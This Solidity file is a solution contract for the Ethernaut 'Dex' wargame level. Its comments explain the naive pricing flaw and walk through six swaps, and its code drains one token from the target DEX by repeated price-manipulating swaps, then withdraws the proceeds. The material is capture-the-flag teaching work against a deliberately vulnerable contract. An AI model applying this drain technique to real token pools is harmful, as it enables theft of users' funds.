// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}

/**
 * @title DexExploit
 * @dev Solution contract for Ethernaut Level 22 - Dex
 * 
 * This contract exploits the Dex contract by manipulating prices through repeated swaps.
 * 
 * The vulnerability in the Dex contract:
 * - The getSwapPrice function uses a simple formula: (amount * toBalance) / fromBalance
 * - This formula doesn't account for slippage or proper AMM pricing
 * - Each swap changes the ratio, making subsequent swaps more favorable
 * - By swapping back and forth, we can drain one token completely
 * 
 * Attack Strategy:
 * 1. Start with 10 tokens of each type (token1 and token2)
 * 2. DEX starts with 100 of each token
 * 3. Swap all token1 for token2, getting back more than we started
 * 4. Swap all token2 for token1, getting back even more
 * 5. Repeat until we can drain all of one token from the DEX
 * 
 * Swap Sequence Analysis:
 * Initial: Player(10,10) DEX(100,100)
 * 
 * Swap 1: Swap 10 token1 -> token2
 * - Get: (10 * 100) / 100 = 10 token2
 * - Result: Player(0,20) DEX(110,90)
 * 
 * Swap 2: Swap 20 token2 -> token1
 * - Get: (20 * 110) / 90 = 24 token1
 * - Result: Player(24,0) DEX(86,110)
 * 
 * Swap 3: Swap 24 token1 -> token2
 * - Get: (24 * 110) / 86 = 30 token2
 * - Result: Player(0,30) DEX(110,80)
 * 
 * Swap 4: Swap 30 token2 -> token1
 * - Get: (30 * 110) / 80 = 41 token1
 * - Result: Player(41,0) DEX(69,110)
 * 
 * Swap 5: Swap 41 token1 -> token2
 * - Get: (41 * 110) / 69 = 65 token2
 * - Result: Player(0,65) DEX(110,45)
 * 
 * Swap 6: Swap 45 token2 -> token1 (only 45 to drain exactly 110 token1)
 * - Get: (45 * 110) / 45 = 110 token1
 * - Result: Player(110,20) DEX(0,90)
 * 
 * Success! We've drained all token1 from the DEX!
 */
contract DexExploit {
    address public dex;
    address public token1;
    address public token2;
    address public owner;

    event SwapExecuted(string description, address from, address to, uint256 amount);
    event BalanceUpdate(string description, uint256 playerToken1, uint256 playerToken2, uint256 dexToken1, uint256 dexToken2);

    constructor(address _dex) {
        dex = _dex;
        owner = msg.sender;
        token1 = IDex(dex).token1();
        token2 = IDex(dex).token2();
    }

    /**
     * @dev Execute the complete exploit to drain token1 from the DEX
     * This performs a series of swaps to manipulate the price and drain funds
     */
    function exploit() external {
        require(msg.sender == owner, "Not the owner");
        
        // Approve the DEX to spend our tokens
        IERC20(token1).approve(dex, type(uint256).max);
        IERC20(token2).approve(dex, type(uint256).max);
        
        logBalances("Initial state");
        
        // Perform the swap sequence
        // Swap 1: 10 token1 -> token2
        swapAll(token1, token2, "Swap 1");
        
        // Swap 2: All token2 -> token1
        swapAll(token2, token1, "Swap 2");
        
        // Swap 3: All token1 -> token2
        swapAll(token1, token2, "Swap 3");
        
        // Swap 4: All token2 -> token1
        swapAll(token2, token1, "Swap 4");
        
        // Swap 5: All token1 -> token2
        swapAll(token1, token2, "Swap 5");
        
        // Swap 6: Carefully swap just enough to drain token1 from DEX
        // At this point we should have 65 token2, and DEX has (110 token1, 45 token2)
        // We need to swap exactly 45 token2 to get all 110 token1
        uint256 dexToken2Balance = IERC20(token2).balanceOf(dex);
        
        // Calculate exact amount needed to drain token1
        // We want: (amount * dexToken1Balance) / dexToken2Balance = dexToken1Balance
        // So: amount = dexToken2Balance
        uint256 amountToSwap = dexToken2Balance;
        
        emit SwapExecuted("Swap 6 (Final drain)", token2, token1, amountToSwap);
        IDex(dex).swap(token2, token1, amountToSwap);
        logBalances("After Swap 6");
        
        logBalances("Final state - Exploit complete!");
    }

    /**
     * @dev Swap all tokens of one type for another
     */
    function swapAll(address from, address to, string memory description) internal {
        uint256 balance = IERC20(from).balanceOf(address(this));
        emit SwapExecuted(description, from, to, balance);
        IDex(dex).swap(from, to, balance);
        logBalances(string(abi.encodePacked("After ", description)));
    }

    /**
     * @dev Log current balances for debugging
     */
    function logBalances(string memory description) internal {
        uint256 playerToken1 = IERC20(token1).balanceOf(address(this));
        uint256 playerToken2 = IERC20(token2).balanceOf(address(this));
        uint256 dexToken1 = IERC20(token1).balanceOf(dex);
        uint256 dexToken2 = IERC20(token2).balanceOf(dex);
        
        emit BalanceUpdate(description, playerToken1, playerToken2, dexToken1, dexToken2);
    }

    /**
     * @dev Check token balances
     */
    function checkBalances() external view returns (
        uint256 playerToken1,
        uint256 playerToken2,
        uint256 dexToken1,
        uint256 dexToken2
    ) {
        playerToken1 = IERC20(token1).balanceOf(address(this));
        playerToken2 = IERC20(token2).balanceOf(address(this));
        dexToken1 = IERC20(token1).balanceOf(dex);
        dexToken2 = IERC20(token2).balanceOf(dex);
    }

    /**
     * @dev Calculate what we would get from a swap
     */
    function getSwapAmount(address from, address to, uint256 amount) external view returns (uint256) {
        return IDex(dex).getSwapPrice(from, to, amount);
    }

    /**
     * @dev Withdraw tokens to owner (for cleanup)
     */
    function withdraw(address token) external {
        require(msg.sender == owner, "Not the owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }
}
